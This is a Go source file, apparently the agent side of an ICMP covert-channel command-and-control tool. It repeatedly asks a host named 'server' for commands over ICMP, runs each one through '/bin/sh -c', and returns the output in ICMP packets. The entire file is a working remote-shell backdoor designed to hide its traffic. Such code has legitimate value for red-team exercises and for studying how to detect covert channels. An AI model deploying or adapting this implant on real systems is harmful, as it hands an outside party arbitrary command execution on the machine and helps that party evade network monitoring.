package main

import (
	"github.com/andrewdo/go-icmp-data/transport"
	"log"
	"net"
	"os/exec"
	"sync"
	"time"
)

const retrySeconds = 5

func pollForCommands(s net.Addr) {
	for {
		cmdP := transport.Send(s, []byte(""), transport.IcmpCodeCommandRequest)
		log.Println("Got command", cmdP)
		if string(cmdP.Body.Data) != "" {
			go runCommandAndReport(cmdP)
		}

		time.Sleep(retrySeconds * time.Second)
	}
}

func runCommandAndReport(cmdP *transport.Packet) {
	cmd := string(cmdP.Body.Data)

	log.Println("Running command", cmd)
	c := exec.Command("/bin/sh", "-c", cmd)
	o, err := c.CombinedOutput()
	if err != nil {
		log.Println(err)
	}

	log.Println("Sending output", string(o))
	go transport.Send(*cmdP.From, o, transport.IcmpCodeCommandOutput)
}

func main() {
	addr, err := net.LookupIP("server")
	if err != nil {
		panic(err)
	}
	a := &net.IPAddr{IP: addr[0]}

	var wg sync.WaitGroup
	wg.Add(1)

	go pollForCommands(a)

	wg.Wait()
}